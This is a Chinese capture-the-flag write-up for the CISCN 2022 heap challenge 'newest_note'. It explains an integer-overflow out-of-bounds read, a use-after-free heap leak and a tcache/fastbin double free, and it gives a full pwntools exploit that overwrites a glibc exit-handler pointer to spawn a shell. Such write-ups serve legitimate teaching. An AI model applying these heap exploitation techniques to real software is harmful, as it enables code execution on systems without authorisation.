# [CISCN 2022 初赛]newest_note



## 题目简述：

![01-ida-main](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\01-ida-main.png)

main函数开始处要求输入"How many pages your notebook will be? :"，输入的数据记录到bss段的::num，作为chunk_list可以拥有的idx数。该main中只有add，delete，show功能不能在申请后随时edit。

**通过申请一个巨大的chunk实现任意地址show**

这里有一个知识点也相当于有个漏洞**（整数溢出）**我们可以利用它申请一个非常大的合法idx范围：

通过输入0x40040000，此时会malloc(0x40040000*8)=malloc(0x200200000)我们知道申请一个很大的chunk默认是大于128k时libc会通过mmap申请内存，我们可以在**接近libc的地方得到一个较大内存而不在heap段**，不过这里要注意0x200200000甚至超过了int大小整数溢出得到0x200000,实际只申请这么大的chunk。显然**实际可用的idx范围最大只有262144（实际只申请到0x200000）但因为存入::num的时0x40040000所以合法的idx远大于262144。**

![02-ida-add](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\02-ida-add.png)

add实现如上，idx可选，add操作次数存在限制（45，对本题比较宽裕，不会接近上限），malloc大小固定为0x30而且只能在add时写入0x30B数据（本题不存在edit所以只能在申请时写入数据）。

![03-ida-delete](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\03-ida-delete.png)

del函数存在次数限制（11，限制较大，但能满足填满tcache要求），且存在uaf但因为缺失edit函数uaf利用遭到限制。

![04-ida-show](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\04-ida-show.png)

关注show函数实现，我们知道::num=0x40040000，可以传入一个很大的idx大小，我们看输出内容的puts函数，将chunk_list+num作为指针输出，显然在c语言这里不会有边界检查所以当num够大我们可以将libc中某个存了指向libc地址的指针作为puts函数参数。

![05-ida-get_num](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\05-ida-get_num.png)

另外还有get num函数的实现，这里没什么特殊的。

## 思路：

首先依据我们之前得到的思路传入0x40040000调试时根据程序基址+chunk list指针偏移得到chunk list开始地址发现在libc前面的一块用户空间。

![06-gdb-memory](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\06-gdb-memory.png)

接下来确定我们泄露libc地址对应的idx，可以**使用arena泄露libc地址**，如图，此处arena地址为0x7f494d218c60

![07-gdb-arena](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\07-gdb-arena.png)

可以查看arena结构的内存，这里要注意因为我们的找的是可用的chunk list的idx，因此我们需要找一个保存了指向libc地址的地址，这里可以找0x7f494d218ce0开始的地址。计算该地址对应的idx=（该处地址-chunk list开始地址）/8得到537498（不能直接用上面写的chunk list地址，不是同一次调试，此处环境2.34-0ubuntu3）nssctf平台的该题似乎远程环境有问题idx不是这个数，大概是libc小版本导致的差异？

![08-gdb-memory](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\08-gdb-memory.png)

本题接下来泄露heap基址就很容易了，存在uaf让一个chunk进入tcache，当只有一个0x40chunk时它的fd是（(fd地址>>12)^0）只要了解一点异或运算规律知相当于fd地址>>12,因为堆地址没有超过一页所以**相当于heap base>>12**。

根据这个题的条件，可以使用tcache stash with fastbin double free这个方法：先在tcache中放入7个chunk再在fast bin中分别放入第8，第9chunk，然后再释放一次第8个chunk造成double free（因此这个方法理论上**需要消耗至少10次free**机会）。连续7次申请清空tcache此时再次申请能申请出原来的第8个chunk，此时利用add时写入我们可以将double free转换为任意地址申请。

这里可以考虑exit hook，因为**2.34开始即使保留\__malloc_hook和__free_hook符号但其实函数中也不会调用**。（这里其实刚开始还踩了坑，发现有hook就打算直接用但忘了这个版本这两个hook应该已经取消）

所以接下来思路很明显了，找到exit hook写入one_gadget然后退出利用它拿到shell。

寻找exit hook：

我们可以在退出过程中先进入exit函数步入\_\__run_exit_handles函数，在该函数中先调用\__call_tls_dtors然后遍历\_\_exit_funcs，我们知道\_\_exit_funcs中存在链表结构比如_dl_fini。只要链表中的函数可以被我们覆盖修改就可以让程序在推出过程中调用我们想要的函数。

![09-gdb](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\09-gdb.png)

如上调用第一个函数call rax，但我们发现rax原本保存的指针是被加密的（存在与point guard异或），因为我们没有泄露point guard所以不能选这个。

![10-gdb](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\10-gdb.png)

![11-gdb](D:\项目整理\ctf-writeups\pwn\heap\[CISCN 2022 初赛]newest_note\images\11-gdb.png)

第二个就可以使用了，可修改而且未加密，我们可以找到保存这个hook的位置。

我们要把exit hook的这个偏移处当成chunk申请出来但要注意需要对齐到0x10，这里可以申请出0x6c0处并写入连续两个gadget。

```exp
from pwn import *

elf = ELF('./newest_note')
libc = ELF('./libc.so.6')
# context(arch=elf.arch, os=elf.os, log_level = 'debug')
p = process([elf.path])

def add_chunk(index, content):
    p.sendafter(b"4. Exit\n", b"1\n")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Content: ", content)
    

def delete_chunk(index):
    p.sendafter(b"4. Exit\n", b"2\n")
    p.sendlineafter(b"Index: ", str(index).encode())


def show_chunk(index):
    p.sendafter(b"4. Exit\n", b"3\n")
    p.sendlineafter(b"Index: ", str(index).encode())

p.sendlineafter(b"How many pages your notebook will be? :",b'1074003968')
show_chunk(537498)
libc.address=u64(p.recvuntil(b'\x7F')[-6:].ljust(8,b'\x00'))-0x218cc0
log.info("libc.address: "+hex(libc.address))

one_gadget=libc.address+[0xeeccc,0xeeccf,0xeecd2][0]

add_chunk(0, b'aaa') #1
for i in range(1,9):
    add_chunk(i, b'aaa') #2-9
delete_chunk(0) #1
show_chunk(0)
heap_addr=u64(p.recvuntil(b'\x05')[-5:].ljust(8,b'\x00'))<<12
log.info("heap_addr: "+hex(heap_addr))

chunk_list_addr = heap_addr + 0x2a0

for i in range(1,7):
    delete_chunk(i) #2-7
delete_chunk(7)
delete_chunk(8)
delete_chunk(7) #10

for i in range(0,7):
    add_chunk(i, p64(0)+p64(0x431)) #16
exit_hook = libc.address + 0x21a6c0
# log.info("__malloc_hook: "+hex(libc.sym['__malloc_hook']))
add_chunk(7, p64(exit_hook^(heap_addr>>12)))
add_chunk(8, b'aaa')
add_chunk(7, b'/bin/sh\x00')
add_chunk(9, p64(one_gadget)*2) #chunk_list,0-5,20次add

# add_chunk(15, b'aaa')
p.sendafter(b"4. Exit\n", b"4\n")

# gdb.attach(p)
p.interactive()

```

